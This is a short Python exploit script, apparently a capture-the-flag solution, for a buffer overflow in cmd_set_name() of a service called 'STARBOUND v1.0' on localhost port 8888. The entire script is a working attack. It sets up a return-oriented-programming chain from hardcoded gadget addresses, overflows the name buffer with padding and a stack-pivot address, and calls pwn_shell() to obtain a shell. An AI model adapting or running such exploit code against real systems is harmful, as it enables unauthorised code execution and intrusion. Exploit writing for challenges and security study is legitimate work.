#!/usr/bin/env python

'''
Buffer overflow in cmd_set_name() (256 -> 128)
'''

from util import *

s = service()
s.connect('127.0.0.1', 8888)
s.recvuntil('-+STARBOUND v1.0+-')

rop_chain = s.rop_setup(
    read = 0x08048A70, 
    write = 0x08048A30,
    leave = 0x0804A673, 
    buf = 0x08058BF0,
    pop_bx_si_di_bp = 0x080496E3)

s.recvuntil('> ')
s.send('6\n')
s.recvuntil('> ')
s.send('2'.ljust(8) + rop_chain + '\n')     # 2) ROP start from here
s.recvuntil('Enter your name: ')
s.send('A'*172 + p32(0x0804997E) + '\n')    # 1) add esp, 0x1c; retn;

s.pwn_shell()

s.close()
